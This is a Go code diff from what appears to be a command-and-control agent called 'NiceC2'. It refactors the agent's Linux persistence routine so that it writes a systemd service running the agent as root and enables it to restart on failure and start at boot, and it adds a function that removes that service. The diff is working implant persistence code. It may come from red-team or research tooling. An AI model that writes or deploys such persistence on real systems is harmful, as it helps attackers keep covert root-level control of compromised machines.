@@ -47,7 +47,10 @@ func main() {
 	case "linux":
 		fmt.Println("Linux")
 
-		Linux()
+		err := create_auto_start_Linux(destination_path)
+		if err != nil {
+			fmt.Sprintln(err)
+		}
 
 	case "darwin":
 		fmt.Println("MacOS")
@@ -246,7 +249,7 @@ func runCommand(command string) (outString string, errorMessage string) {
 
 }
 
-func Linux() {
+func create_auto_start_Linux(installPath string) error {
 
 	// Set the path to the systemd service file
 	serviceFilePath := "/etc/systemd/system/NiceC2.service"
@@ -255,7 +258,7 @@ func Linux() {
 	serviceFile, err := os.Create(serviceFilePath)
 	if err != nil {
 		fmt.Println("Error creating service file:", err)
-		return
+		return err
 	}
 	defer serviceFile.Close()
 
@@ -265,16 +268,17 @@ Description=NiceC2 agent
 After=network.target
 
 [Service]
-ExecStart=/usr/local/bin/NiceC2/persistance_test
+ExecStart=` + installPath + `
 WorkingDirectory=/usr/local/bin/
 Restart=on-failure
 User=root
 
 [Install]
 WantedBy=multi-user.target`)
+
 	if err != nil {
 		fmt.Println("Error writing service file:", err)
-		return
+		return err
 	}
 
 	// Reload the systemd configuration
@@ -282,7 +286,7 @@ WantedBy=multi-user.target`)
 	err = reloadCmd.Run()
 	if err != nil {
 		fmt.Println("Error reloading systemd configuration:", err)
-		return
+		return err
 	}
 
 	// Enable the service to auto-start at boot
@@ -290,10 +294,33 @@ WantedBy=multi-user.target`)
 	err = enableCmd.Run()
 	if err != nil {
 		fmt.Println("Error enabling service to auto-start at boot:", err)
-		return
+		return err
 	}
 
 	fmt.Println("Service created and registered to auto-start at boot as root.")
 
-	return
+	return nil
+}
+
+func remove_auto_start_linux() error {
+	// Disable the service from auto-starting at boot
+	disableCmd := exec.Command("systemctl", "disable", "NiceC2.service")
+	if err := disableCmd.Run(); err != nil {
+		return fmt.Errorf("error disabling service from auto-starting at boot: %v", err)
+	}
+
+	// Stop the service if it is running
+	stopCmd := exec.Command("systemctl", "stop", "NiceC2.service")
+	if err := stopCmd.Run(); err != nil {
+		return fmt.Errorf("error stopping service: %v", err)
+	}
+
+	// Remove the systemd service file
+	serviceFilePath := "/etc/systemd/system/NiceC2.service"
+	if err := os.Remove(serviceFilePath); err != nil {
+		return fmt.Errorf("error removing service file: %v", err)
+	}
+
+	fmt.Println("Service removed and disabled from auto-starting at boot.")
+	return nil
 }
